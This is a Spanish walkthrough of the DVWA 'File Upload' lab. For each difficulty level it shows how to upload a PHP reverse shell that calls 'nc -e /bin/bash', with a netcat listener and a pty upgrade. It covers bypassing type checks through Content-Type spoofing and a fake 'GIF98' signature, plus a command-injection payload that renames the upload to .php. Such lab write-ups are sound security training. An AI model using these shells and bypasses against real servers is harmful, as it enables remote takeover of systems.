# FU

Las vulnerabilidades de subida de archivos se producen cuando un servidor web permite a los usuarios subir archivos a su sistema de archivos sin validar suficientemente aspectos como su nombre, tipo, contenido o tamaño.

## Bajo

Para realizar este nivel, primero debemos acceder a la página de subida de archivos, para ello accedemos a la página principal de DVWA y pulsamos en `File Upload`. Una vez en la página de subida de archivos, podemos intentar subir una reverse shell.

```php
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

Una vez subida la shell, podemos comprobar como se ha subido correctamente.

![fichero subido](/FU/assets/upload.png)

A continuación, buscamos donde se ha subido el archivo  que según nos indica la respuesta del servidor es en la ruta `http://localhost/DVWA/hackable/uploads/`.

![directorio de ficheros subidos](/FU/assets/directory-low.png)

Ahora, podemos crear una escucha en el puerto 4000 para recibir la conexión de la reverse shell y  a continuación accedemos a la URL de la shell que hemos subido para ejecutarla.

```bash
nc -lvnp 4000
```

Una vez se establece la conexión, podemos comprobar que tenemos acceso al sistema.
Si se desea, se puede hacer un upgrade a una shell interactiva con el comando: 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

En la siguiente imagen podemos observar como hemos obtenido una shell interactiva y hemos podido ejecutar el comando `id` para comprobar que somos el usuario `www-data`.
![ejecución de comandos en una shell remota](/FU/assets/challenge-1.png)

## Medio

Al contrario que en el nivel bajo, en este nivel el servidor web solo permite subir archivos de tipo `jpeg` o `png`, por lo que no podemos replicar la mecánica del nivel anterior.

![error](/FU/assets/error-mid.png)

Para poder subir la shell, debemos cambiar el tipo de archivo a `jpeg` o `png` y para ello podemos utilizar Burp Suite para interceptar la petición y modificar la cabecera `Content-Type` de la petición para que sea `image/jpeg` o `image/png`.

![intercept](/FU/assets/intercept.png)

 Una vez interceptada la petición y modificada la cabecera, podemos enviar la petición y comprobar que se ha subido correctamente.

![fichero subido](/FU/assets/upload.png)

Al igual que en el nivel anterior, podemos observar como se ha obtenido una shell interactiva y hemos podido ejecutar el comando `id` para comprobar que somos el usuario `www-data`.
![challenge-1](/FU/assets/challenge-1.png)

## Alto

En este nivel, el servidor web solo permite subir archivos de tipo `jpeg` o `png` con la diferencia de que esta vez el servidor comprueba los primeros bytes del archivo para comprobar que el tipo de archivo es correcto.

Para poder evadir esta comprobación, podemos utilizar la técnica de `file signature` para cambiar los primeros bytes del archivo y que el servidor web lo reconozca como un archivo de tipo `jpeg` o `png` se ha escrito `GIF98` al comienzo de nuestra reverse shell.

```php
GIF98
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

En la siguiente imagen podemos observar el contenido de nuestro fichero `shell.png` en un editor hexadecimal (`hexeditor`).

![hexeditor](/FU/assets/hexeditor.png)

Una vez modificado el archivo, podemos subirlo al servidor web y comprobar que se ha subido correctamente.

![fichero imagen subido](/FU/assets/upload-high.png)

Una vez subida, intentamos acceder a la shell mediante la uri que nos proporciona el servidor web y comprobamos que nos da un error como era de esperar.

![error al acceder al recurso](/FU/assets/error-high.png)

Para lograr nuestro objetivo podemos intentar combinarlo con otra vulnerabilidad como es la `Command Injection` para poder acceder a la shell que hemos subido.

Para ello, podemos utilizar la siguiente payload desde la sección de `Command Injection` de DVWA.

```bash
|mv ../../hackable/uploads/shell.png ../../hackable/uploads/shell.php
```

Una vez ejecutado el payload, podemos acceder a la shell mediante la uri que nos proporciona el servidor web y comprobar que tenemos acceso al sistema.

![challenge](/FU/assets/challenge-2.png)